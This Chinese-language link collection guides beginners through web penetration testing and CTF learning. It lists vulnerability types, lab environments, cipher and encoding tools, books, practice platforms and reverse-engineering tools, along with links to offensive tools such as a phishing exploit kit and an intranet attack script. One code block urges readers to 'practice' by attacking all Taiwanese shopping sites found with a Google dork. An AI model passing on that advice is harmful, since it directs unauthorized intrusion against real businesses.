[https://mp.weixin.qq.com/s?__biz=MzI3MTY5NzI2Mw==&mid=2247484108&idx=1&sn=2eb978edf55dbb22e3cee6bc06817605&chksm=eb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61&xtrack=1&scene=0&subscene=131&clicktime=1555484172&ascene=7&devicetype=android-27&version=2700033c&nettype=cmnet&abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA&lang=zh_CN&pass_ticket=aI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ&wx_header=1](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTY5NzI2Mw%3D%3D%26mid%3D2247484108%26idx%3D1%26sn%3D2eb978edf55dbb22e3cee6bc06817605%26chksm%3Deb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61%26xtrack%3D1%26scene%3D0%26subscene%3D131%26clicktime%3D1555484172%26ascene%3D7%26devicetype%3Dandroid-27%26version%3D2700033c%26nettype%3Dcmnet%26abtest_cookie%3DBAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA%26lang%3Dzh_CN%26pass_ticket%3DaI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ%26wx_header%3D1)\n 域渗透\n [https://start.me/p/X20Apn](https://links.jianshu.com/go?to=https%3A%2F%2Fstart.me%2Fp%2FX20Apn)\n LiveOverflow-YouTube\n\n[https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUClcE-kVhqyiHCcjYwcpfj9w)\n [http://vipread.com/index](https://links.jianshu.com/go?to=http%3A%2F%2Fvipread.com%2Findex)这里面有些信息收集的ppt�\n\nPOC编写指南\n [https://poc.evalbug.com/chapter1/1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html)\n CTF入门指南\n 新手的渗透学习流程：\n 1、有哪些漏洞需要了解？\n SQL注入、XSS、上传、csrf、xsrf、ssrf、crlf、xxe、url跳转、任意文件下载（读取）、弱口令、暴库、信息泄露、\n 域传送、跨域（cors、jsonp、crossdomain）、反序列化、远程命令执行、拒绝服务、配置错误等等\n\n\n\n```undefined\n逻辑：任意用户注册（登录、密码重置），支付漏洞，劫持，参数污染，条件竞争等等\ncms漏洞：phpcms，dedecms，discuz、drupal、wordpress、spring、struts2、jboss、weblogic、joomla、jenkins等等\n端口漏洞：elasticsearch、samba、redis、mongodb、zookeeper、memcache、hadoop、couchdb、ldap、rsync等等\nFUZZ字典（CRLF、jsonp、ua、url、xss、xxe、rce、dir、upload、sql、name、password）等等\n```\n\n2、学习地址？\n 各种漏洞                                        [http://wiki.chamd5.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwiki.chamd5.org%2F)\n [https://github.com/JnuSimba/MiscSecNotes](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FJnuSimba%2FMiscSecNotes)\n web漏洞总结                                     [https://github.com/CHYbeta/Web-Security-Learning](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning)\n 乌云镜像\n [https://www.madebug.net/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.madebug.net%2F)                                        [https://wooyun.shuimugan.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwooyun.shuimugan.com%2F)\n cms漏洞                                           [https://github.com/Lucifer1993/AngelSword](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLucifer1993%2FAngelSword)\n 国外漏洞                                        [https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2019](https://links.jianshu.com/go?to=https%3A%2F%2Fpentester.land%2Flist-of-bug-bounty-writeups.html%23bug-bounty-writeups-published-in-2019)\n 更多学习地址尽在内部群\n\n3、靶场\n 靶场：                                         [http://www.freebuf.com/sectool/4708.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.freebuf.com%2Fsectool%2F4708.html)\n 漏洞靶场，docker搭建，有些靶场内附py文件        [https://github.com/vulhub/vulhub](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub)\n [https://github.com/Medicean/VulApps/](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FMedicean%2FVulApps%2F)\n [http://vulapps.evalbug.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fvulapps.evalbug.com%2F)\n [https://github.com/SecWiki/CMS-Hunter](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2FCMS-Hunter)\n [https://github.com/klionsec/PhishingExploit](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fklionsec%2FPhishingExploit)\n [http://www.vulnspy.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vulnspy.com%2F)\n 上传漏洞靶场：                                 [https://github.com/c0ny1/upload-labs](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fupload-labs)\n XXE漏洞靶场：                                    [https://github.com/c0ny1/xxe-lab](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fxxe-lab)\n 一键搭建12个漏洞平台                         [https://github.com/c0ny1/vulstudy](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fvulstudy)\n 各类型漏洞靶场                                 [https://github.com/gh0stkey/DoraBox](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgh0stkey%2FDoraBox)\n AWD环境搭建[http://jjhpkcr.xyz/2019/04/29/awd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/?nsukey=kcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D](https://links.jianshu.com/go?to=http%3A%2F%2Fjjhpkcr.xyz%2F2019%2F04%2F29%2Fawd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%2F%3Fnsukey%3DkcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D)\n\n4、如何学习\n 多逛论坛：i春秋、吐司、90等等\n 多看大佬博客\n 和志同道合的小伙伴一起挖洞\n\n\n\n```css\n想实战检验自己的学习成果，就去把台湾的所有商城网站挖一遍。谷歌语法:site:*.tw商城\n挖完了所有商城网站，可以去挖各大SRC。\n```\n\n如何入门？如何组队？\n\ncapturetheflag夺旗比赛\n\n类型：\n\nWeb\n 密码学\n xssee:[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\nxssee:[http://evilcos.me/lab/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fevilcos.me%2Flab%2Fxssee)\n\n(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):[http://tool.chacuo.net/cryptdes](https://links.jianshu.com/go?to=http%3A%2F%2Ftool.chacuo.net%2Fcryptdes)\n\n在线编码解码(多种并排):[http://bianma.911cha.com](https://links.jianshu.com/go?to=http%3A%2F%2Fbianma.911cha.com)\n\n在线加密解密(多种):[http://encode.chahuo.com](https://links.jianshu.com/go?to=http%3A%2F%2Fencode.chahuo.com)\n\nUnicode转中文:[http://www.bejson.com/convert/unicode_chinese](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Funicode_chinese)\n\n栅栏密码&&凯撒密码&&摩斯电码:[http://heartsnote.com/tools/cipher.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fheartsnote.com%2Ftools%2Fcipher.htm)\n\nCaesarcipher(凯撒密码):[http://planetcalc.com/1434/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F1434%2F)\n\nQuoted-Printable&&ROT13:[http://www.mxcz.net/tools/QuotedPrintable.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.mxcz.net%2Ftools%2FQuotedPrintable.aspx)\n\nROT5/13/18/47编码转换:[http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2FROT5-13-18-47.php)\n\nBase32/16:[http://pbaseconverter.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpbaseconverter.com%2F)\n\nBase32:[https://tools.deamwork.com/crypt/decrypt/base32decode.html](https://links.jianshu.com/go?to=https%3A%2F%2Ftools.deamwork.com%2Fcrypt%2Fdecrypt%2Fbase32decode.html)\n\nquipqiup古典密码自动化爆破(词频分析):[http://quipqiup.com/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fquipqiup.com%2Findex.php)\n\n词频分析/替换:[http://cryptoclub.org/tools/cracksub_topframe.php](https://links.jianshu.com/go?to=http%3A%2F%2Fcryptoclub.org%2Ftools%2Fcracksub_topframe.php)\n\n'+.<>[]'&&'!.?'(Brainfuck/Ook!):[https://www.splitbrain.org/services/ook](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.splitbrain.org%2Fservices%2Fook)\n\n'+-.<>[]'(Brainfuck):[https://www.nayuki.io/page/brainfuck-interpreter-javascript](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.nayuki.io%2Fpage%2Fbrainfuck-interpreter-javascript)\n\n'+-.<>[]'(Brainfuck):[http://esoteric.sange.fi/brainfuck/impl/interp/i.html](https://links.jianshu.com/go?to=http%3A%2F%2Fesoteric.sange.fi%2Fbrainfuck%2Fimpl%2Finterp%2Fi.html)\n\n'()[]!+'JavaScript编码(JSfuck):[http://discogscounter.getfreehosting.co.uk/js-noalnum.php](https://links.jianshu.com/go?to=http%3A%2F%2Fdiscogscounter.getfreehosting.co.uk%2Fjs-noalnum.php)\n\n用6个字符'()[]!+'来编写JavaScript程序(JSfuck同上):[http://www.jsfuck.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jsfuck.com%2F)\n\n[http://patriciopalladino.com/files/hieroglyphy/](https://links.jianshu.com/go?to=http%3A%2F%2Fpatriciopalladino.com%2Ffiles%2Fhieroglyphy%2F)\n\n摩斯密码翻译器:[http://www.jb51.net/tools/morse.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jb51.net%2Ftools%2Fmorse.htm)\n\nMorseCode摩尔斯电码:[http://rumkin.com/tools/cipher/morse.php](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2Fmorse.php)\n\n摩尔斯电码转换器:[http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhongguosou.com%2Fzonghe%2FmoErSiCodeConverter.aspx)\n\n字符串编码，解码，转换(长度,反转,进制转换):[http://www.5ixuexiwang.com/str/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.5ixuexiwang.com%2Fstr%2F)\n\nCiscoType7Reverser:[http://packetlife.net/toolbox/type7](https://links.jianshu.com/go?to=http%3A%2F%2Fpacketlife.net%2Ftoolbox%2Ftype7)\n\nCisco:[http://www.ifm.net.nz/cookbooks/passwordcracker.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ifm.net.nz%2Fcookbooks%2Fpasswordcracker.html)\n\ncmd5&&NTLM&&mysql...:[http://www.cmd5.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com)\n\nspammimic(字符2一段话):[http://www.spammimic.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.spammimic.com%2F)\n\njs代码在线加密解密:[https://tool.lu/js/](https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fjs%2F)\n\nJScript/VBscript脚本解密(#@^....^#@):[http://www.dheart.net/decode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dheart.net%2Fdecode%2Findex.php)\n\nVBScript.Encode解密([tip:Aspencode):http://adophper.com/encode.html](https://links.jianshu.com/go?to=tip%3AAspencode)%3Ahttp%3A%2F%2Fadophper.com%2Fencode.html)\n\nJScript.Encode脚本加密与解密:[http://www.haokuwang.com/jsendecode.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.haokuwang.com%2Fjsendecode.htm)\n\n'+/v+'UTF-7加密:[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\n各种无知密码解密:[http://www.tools88.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tools88.com)\n\nuuencode解码&&xxencode解码(古老的邮件密码):[http://web.chacuo.net/charsetuuencode](https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetuuencode)\n\nMIME标准(邮件编码的一种):[http://dogmamix.com/MimeHeadersDecoder/](https://links.jianshu.com/go?to=http%3A%2F%2Fdogmamix.com%2FMimeHeadersDecoder%2F)\n\nBinhex编码(邮件编码的一种,常见于MAC机):[http://encoders-decoders.online-domain-tools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fencoders-decoders.online-domain-tools.com%2F)\n\n%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):[http://web.chacuo.net/charsetescape](https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetescape)\n\n猪圈密码:[http://www.simonsingh.net/The_Black_Chamber/pigpen.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.simonsingh.net%2FThe_Black_Chamber%2Fpigpen.html)\n\nppencode(把Perl代码转换成只有英文字母的字符串):[http://namazu.org/~takesako/ppencode/demo.html](https://links.jianshu.com/go?to=http%3A%2F%2Fnamazu.org%2F~takesako%2Fppencode%2Fdemo.html)\n\naaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):[http://utf-8.jp/public/aaencode.html](https://links.jianshu.com/go?to=http%3A%2F%2Futf-8.jp%2Fpublic%2Faaencode.html)\n\n'()[]!+'&&'$=~[]+\"_.();'jother编码jjencode(JS代码转换成只有符号的字符串):[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\njother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：!+()[]{}。只用这些字符就能完成对任意字符串的编码）:[http://tmxk.org/jother/](https://links.jianshu.com/go?to=http%3A%2F%2Ftmxk.org%2Fjother%2F)\n\njjencode/aaencode可用xssee&&Chrome的Console模式来直接输出解密。\n\nManchester曼彻斯特解密：[http://eleif.net/manchester.html](https://links.jianshu.com/go?to=http%3A%2F%2Feleif.net%2Fmanchester.html)\n\nVigenère维多利亚解密：[https://www.guballa.de/vigenere-solver](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.guballa.de%2Fvigenere-solver)\n\nVigenèrecipher:[http://planetcalc.com/2468/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F2468%2F)\n\nHillcipher(希尔密码):[http://planetcalc.com/3327/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F3327%2F)\n\nAtbashcipher(埃特巴什码):[http://planetcalc.com/4647/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F4647%2F)\n\nsnow(html隐写):[http://fog.misty.com/perry/ccs/snow/snow/snow.html](https://links.jianshu.com/go?to=http%3A%2F%2Ffog.misty.com%2Fperry%2Fccs%2Fsnow%2Fsnow%2Fsnow.html)\n\nSerpent加密解密:[http://serpent.online-domain-tools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fserpent.online-domain-tools.com%2F)\n\n十六进制Hex转文本字符串:[http://www.bejson.com/convert/ox2str/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Fox2str%2F)\n\nHex2text:[http://www.convertstring.com/EncodeDecode/HexDecode](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.convertstring.com%2FEncodeDecode%2FHexDecode)\n\nBinary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):[http://www.binaryhexconverter.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.binaryhexconverter.com%2F)\n\n集合:[http://www.qqxiuzi.cn/daohang.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fdaohang.htm)\n\n集合（各种古典密码）:[http://rumkin.com/tools/cipher/](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F)\n\n文本加密为汉字(\"盲文\"，音符，各种语言，花朵，箭头...):[http://www.qqxiuzi.cn/bianma/wenbenjiami.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2Fwenbenjiami.php)\n\n在线繁体字转换器:[http://www.aies.cn](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.aies.cn)\n\n在线工具集合:[http://tomeko.net/online_tools/](https://links.jianshu.com/go?to=http%3A%2F%2Ftomeko.net%2Fonline_tools%2F)\n\n二维码/条形码:[https://online-barcode-reader.inliteresearch.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fonline-barcode-reader.inliteresearch.com%2F)\n\n生成二维码:[http://www.wwei.cn/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wwei.cn%2F)\n\n在线二维码解密:[http://jiema.wwei.cn/](https://links.jianshu.com/go?to=http%3A%2F%2Fjiema.wwei.cn%2F)\n\nImage2Base64:[http://www.vgot.net/test/image2base64.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vgot.net%2Ftest%2Fimage2base64.php)\n\n与佛论禅:[http://www.keyfc.net/bbs/tools/tudoucode.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.keyfc.net%2Fbbs%2Ftools%2Ftudoucode.aspx)\n\n在线分解GIF帧图:[http://zh.bloggif.com/gif-extract](https://links.jianshu.com/go?to=http%3A%2F%2Fzh.bloggif.com%2Fgif-extract)\n\nbejson(杂乱):[http://www.bejson.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com)\n\natool(杂乱):[http://www.atool.org](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org)\n\nPunchCard:[http://www.kloth.net/services/cardpunch.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.kloth.net%2Fservices%2Fcardpunch.php)\n\n分解素数(ESA):[http://www.factordb.com/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.factordb.com%2Findex.php)\n\n文件在线Hash:[http://www.atool.org/file_hash.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org%2Ffile_hash.php)\n pwn程序的逻辑分析，漏洞利用windows、linux、小型机等\n misc杂项，隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据\n reverse逆向windows、linux类\n ppc编程类的\n\n国内外著名比赛\n\n国外：\n 国内：xctf联赛0ctf上海国内外都有，很强\n\n入门需要哪些基础：\n\n1.编程语言基础（c、汇编、脚本语言）\n 2.数学基础（算法、密码学）\n 3.脑洞大开（天马行空的想象、推理解密）\n 4.体力耐力（通宵熬夜）\n\n如何入门学\n\n1.恶补基础知识\n 2.尝试从脑洞开始如黑客game\n 3.从基础题出发一般都是100，200，最高分在500，600先把100分的学好，可从实践，高中的ctf学起，比较简单，只涉及1，2个点\n 4.学信息安全专业知识\n 5.锻炼体力耐力周六日都有比赛\n\n到底如何学？\n\n1.分析赛题情况\n 2.分析自身能力自己最适合哪个方向\n 3.选择更适合的入手\n\n分析赛题\n\nPWN、Reverse偏重对汇编、逆向的理解对底层理解\n Crypto偏重对数学、算法的深入学习密码课要深入学\n Web偏重对技巧沉淀、快速搜索能力的挑战发散思维，对底层只需要了解，代码原理，关于漏洞点的积累\n Misc则更复杂，所有与计算机安全挑战有关的都在其中隐写，图片数据分析还原，流量，大数据，对游戏分析逆向\n\n常规做法：\n\nA方向：PWN+Reverse+Crypto随机搭配\n B方向：Web+Misc组合\n Misc所有人都可以做\n\n入门知识：\n\n都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析\n\nA方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等\n B方向：Web安全、网络安全、内网渗透、数据库安全等前10的安全漏洞\n\n推荐书：\n\nA方向：\n\nREforBeginners\n IDAPro权威指南\n 揭秘家庭路由器0day漏洞挖掘技术\n 自己定操作系统\n 黑客攻防技术宝典：系统实战篇有各种系统的逆向讲解\n\nB方向：\n\nWeb应用安全权威指南最推荐小白，宏观web安全\n Web前端黑客技术揭秘\n 黑客秘籍——渗透测试实用指南\n 黑客攻防技术宝典web实战篇web安全的所有核心基础点，有挑战性，最常规，最全，学好会直线上升\n 代码审计：企业级web代码安全架构\n\n入门----从基础题目出发（推荐资源）：\n\n[http://ctf.idf.cn](https://links.jianshu.com/go?to=http%3A%2F%2Fctf.idf.cn)!!!首推idf实验室：题目非常基础，只1个点\n [www.ichunqiu.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ichunqiu.com)有线下决赛题目复现\n [http://oj.xctf.org.cn/xctf](https://links.jianshu.com/go?to=http%3A%2F%2Foj.xctf.org.cn%2Fxctf)题库网站，历年题，练习场，比较难\n [www.wechall.net/challs](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wechall.net%2Fchalls)!!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的\n [http://canyouhack.it/](https://links.jianshu.com/go?to=http%3A%2F%2Fcanyouhack.it%2F)国外，入门，有移动安全\n [https://microcorruption.com/loginA](https://links.jianshu.com/go?to=https%3A%2F%2Fmicrocorruption.com%2FloginA)方向密码，逆向酷炫游戏代\n http：//smashthestack.orgA方向，简洁，国外，wargames，过关\n [http://overthewire.ofg/wargames/](https://links.jianshu.com/go?to=http%3A%2F%2Foverthewire.ofg%2Fwargames%2F)！！！！推荐A方向国内资料多，老牌wargame\n https：//exploit-exercises.comA方向老牌wargame，国内资料多\n [http://pawnable.kr/play.phppwn](https://links.jianshu.com/go?to=http%3A%2F%2Fpawnable.kr%2Fplay.phppwn)类游乐场，不到100题\n [http://ctf.moonsoscom/pentest/index.phpB](https://links.jianshu.com/go?to=http%3A%2F%2Fctf.moonsoscom%2Fpentest%2Findex.phpB)方向米安的Web漏洞靶场，基础，核心知识点\n http：//prompt.ml/0B方向国外的xss测试\n [http://redtiger.labs.overthewire.org/B](https://links.jianshu.com/go?to=http%3A%2F%2Fredtiger.labs.overthewire.org%2FB)方向国外sql注入挑战网站，10关，过关的形式不同的注入，循序渐近地练习\n\n工具：\n [https://github.com/truongkma/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools)\n [https://github.com/Plkachu/v0lt](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPlkachu%2Fv0lt)\n [https://github.com/zardus/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools)\n [https://github.com/TUCTF/Tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools)\n\n入门--以练促赛，以赛养练\n\n选择一场已经存在writeup的比赛\n\n总结解题过程，分析出题人想法\n\n参加一场最新的ctf比赛\n https：//ctftime.org/国际比赛，有很多基础的\n http：[//www.xctf.org.cn/](https://links.jianshu.com/go?to=%2F%2Fwww.xctf.org.cn%2F)国内比赛，比较难\n 以及一些ctf要用到的\n 整合版：\n\n[http://www.jz5u.com/Soft/Progra/tool/163275.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jz5u.com%2FSoft%2FProgra%2Ftool%2F163275.html)\n\n各种在线工具以及工具整合\n\n[http://www.ctftools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ctftools.com%2F)\n\n内网自动化渗透脚本[https://github.com/SecureThisShit/WinPwn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecureThisShit%2FWinPwn)\n\n一个初级内网渗透课程\n 视频:[https://pan.baidu.com/s/13yBZg6DaaMP_dRo1XhKooA](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13yBZg6DaaMP_dRo1XhKooA)提取码：aeko\n PPT:[https://pan.baidu.com/s/13r6dH0GBbsuLVFP4nTg5Yg](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13r6dH0GBbsuLVFP4nTg5Yg)提取码：fuh8逆向工程:\n GDB–[http://www.gnu.org/software/gdb/download/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdownload%2F)\n IDAPro–[https://www.hex-rays.com/products/ida/support/download.shtml](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hex-rays.com%2Fproducts%2Fida%2Fsupport%2Fdownload.shtml)\n ImmunityDebugger–[http://debugger.immunityinc.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fdebugger.immunityinc.com%2F)\n OllyDbg–[http://www.ollydbg.de/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ollydbg.de%2F)\n radare2–[http://www.radare.org/y/?p=download](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.radare.org%2Fy%2F%3Fp%3Ddownload)\n Hopper–[http://www.hopperapp.com/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.hopperapp.com%2Fdownload.html)\n nm–unix/linuxtool\n objdump–linuxtool\n strace–linuxtool\n ILSpy–[http://ilspy.net/](https://links.jianshu.com/go?to=http%3A%2F%2Filspy.net%2F)\n JD-GUI–[http://jd.benow.ca/#jd-gui-overview](https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F%23jd-gui-overview)\n FFDec–[http://www.free-decompiler.com/flash/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.free-decompiler.com%2Fflash%2Fdownload.html)\n dex2jar–[http://code.google.com/p/dex2jar/](https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fdex2jar%2F)\n uncompyle2–[https://github.com/wibiti/uncompyle2](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwibiti%2Funcompyle2)\n Hexeditors:\n Windows:\n HxD–[http://mh-nexus.de/en/hxd/](https://links.jianshu.com/go?to=http%3A%2F%2Fmh-nexus.de%2Fen%2Fhxd%2F)\n Neo–[http://www.new-hex-editor.com/hex-editor-downloads.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.new-hex-editor.com%2Fhex-editor-downloads.html)\n Linux:\n Bless–[http://home.gna.org/bless/downloads.html](https://links.jianshu.com/go?to=http%3A%2F%2Fhome.gna.org%2Fbless%2Fdownloads.html)\n wxHexEditor–[http://www.wxhexeditor.org/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wxhexeditor.org%2Fdownload.php)\n Exeunpackers–UnpackingKit2012–[http://forum.exetools.com/showthread.php?t=13610](https://links.jianshu.com/go?to=http%3A%2F%2Fforum.exetools.com%2Fshowthread.php%3Ft%3D13610)\n\n网络:\n Wireshark,tshark–[https://www.wireshark.org/download.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.wireshark.org%2Fdownload.html)\n OpenVPN–[https://openvpn.net/](https://links.jianshu.com/go?to=https%3A%2F%2Fopenvpn.net%2F)\n OpenSSL–[https://www.openssl.org/related/binaries.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.openssl.org%2Frelated%2Fbinaries.html)\n tcpdump–[http://www.tcpdump.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tcpdump.org%2F)\n netcat–[http://netcat.sourceforge.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fnetcat.sourceforge.net%2F)\n nmap–[http://nmap.org/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fnmap.org%2Fdownload.html)\n\n隐写:\n OpenStego–[http://www.openstego.info/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openstego.info%2F)\n OutGuess–[http://www.outguess.org/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.outguess.org%2Fdownload.php)\n Steghide–[http://steghide.sourceforge.net/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fsteghide.sourceforge.net%2Fdownload.php)\n StegFS–[http://sourceforge.net/projects/stegfs/](https://links.jianshu.com/go?to=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fstegfs%2F)\n pngcheck–[http://www.libpng.org/pub/png/apps/pngcheck.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.libpng.org%2Fpub%2Fpng%2Fapps%2Fpngcheck.html)\n GIMP–[http://www.gimp.org/downloads/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gimp.org%2Fdownloads%2F)\n Audacity–[http://audacity.sourceforge.net/download/](https://links.jianshu.com/go?to=http%3A%2F%2Faudacity.sourceforge.net%2Fdownload%2F)\n 